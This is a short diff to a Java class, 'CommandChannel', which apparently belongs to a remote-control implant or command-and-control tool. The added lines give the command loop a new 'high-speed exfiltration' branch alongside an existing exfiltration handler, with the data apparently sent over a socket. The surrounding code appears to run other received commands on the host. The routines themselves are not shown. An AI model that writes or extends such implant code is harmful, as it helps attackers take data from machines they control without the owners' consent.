@@ -47,6 +47,8 @@ public class CommandChannel implements Runnable{
 						}
 						if(ech.checkExfil(command)){
 							System.out.println(ech.handleExfil(command,msus));
+						}else if (ech.checkHighSpeedExfil(command)){
+							ech.highSpeedExfiltrate(command, s);
 						}else{
 							try{
 								System.out.println("On Windows: "+!System.getProperty("os.name").contains("Windows"));
